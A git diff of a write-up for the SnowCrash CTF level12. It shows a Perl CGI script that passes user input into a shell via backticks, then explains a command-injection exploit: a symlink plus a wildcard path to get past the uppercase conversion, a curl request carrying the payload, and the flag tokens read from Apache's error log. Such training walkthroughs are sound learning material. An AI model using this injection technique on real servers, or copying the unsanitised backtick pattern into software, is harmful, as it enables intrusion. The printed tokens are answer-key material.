@@ -1,51 +1,45 @@
-When we started the level we found a level12.pl.
-=> 
-#!/usr/bin/env perl
-# localhost:4646
-use CGI qw{param};
-print "Content-type: text/html\n\n";
+# level12
 
-sub t {
-  $nn = $_[1];
-  $xx = $_[0];
-  $xx =~ tr/a-z/A-Z/; 
-  $xx =~ s/\s.*//;
-  @output = `egrep "^$xx" /tmp/xd 2>&1`;
-  foreach $line (@output) {
-      ($f, $s) = split(/:/, $line);
-      if($s =~ $nn) {
-          return 1;
-      }
-  }
-  return 0;
-}
+When we started the level we found a level12.pl that you can find in the resources of this exercice.
 
-sub n {
-  if($_[0] == 1) {
-      print("..");
-  } else {
-      print(".");
-  }    
-}
+We can easily have a first thought on where the exploit is. Here again there is a user input with very little sanitizing, which leads us to think that this might be the weak point of this program:
 
-n(t(param("x"), param("y")));
+```
+`@output = `egrep "^$xx" /tmp/xd 2>&1`;`
+```
 
-We can easily understand that the security breach is `@output = `egrep "^$xx" /tmp/xd 2>&1`;`
+We tried to make some injections but the regex turns our ls to => LS (everything is changed in caps lock) provoking some errors but nothing interesting for us.
 
-We tried to made some injections but the regex turn our ls to => LS that make some errors .. 
-After one full day of research we tried to exec /bin/ls and to trasnfer the result in the error file of apache in /var/log/apache2/error.log and we finaly get some error to try to debug things : [Thu Feb 08 13:33:52 2024] [error] [client 127.0.0.1] /*/LS: not found.
+After a full day of research, trying a lot of non working solutions like a malicious egrep, trying to execute code in the file that the code analyzes, analyzing apache2 configuration etc... We thought that maybe we hadn't given everything on this user input solution.
 
-After this we got idea to just make a link beetween /bin/ls and /tmp/LS : ln -s /bin/ls /tmp/LS
+We know that we can find the result in the error file of apache in /var/log/apache2/error.so why not working with it:
+
+```
+[Thu Feb 08 13:33:52 2024] [error] [client 127.0.0.1] LS: not found.
+```
+
+After this we had the idea to simply make a link between /bin/ls and /tmp/LS, a file that we created, and which is in caps lock, so handy with what this perl code does:
+
+```
+ln -s /bin/ls /tmp/LS
+```
+
 Then trying to execute curl '127.0.0.1:4646/?x=`/*/ls%3E%262`'.
 
-This work, we got an LS in the errorlog of Apache
+This worked, we got an LS in the error log of Apache
 
-Do this with Getflag and we finaly get the flag ! cat /var/log/apache2/error.log :
+Do this with getflag and we finally got what we were looking for !
+
+```
+level12@SnowCrash:~$ cat /var/log/apache2/error.log
 [Thu Feb 08 13:41:20 2024] [error] [client 127.0.0.1] Check flag.Here is your token : g1qKMiRpXf53AWhDaU7FEkczr
+```
 
+```
 /*********************************************************\
 
 flag12@SnowCrash:~$ getflag
 Check flag.Here is your token : fa6v5ateaw21peobuub8ipe6s
 
 \*********************************************************/
+```
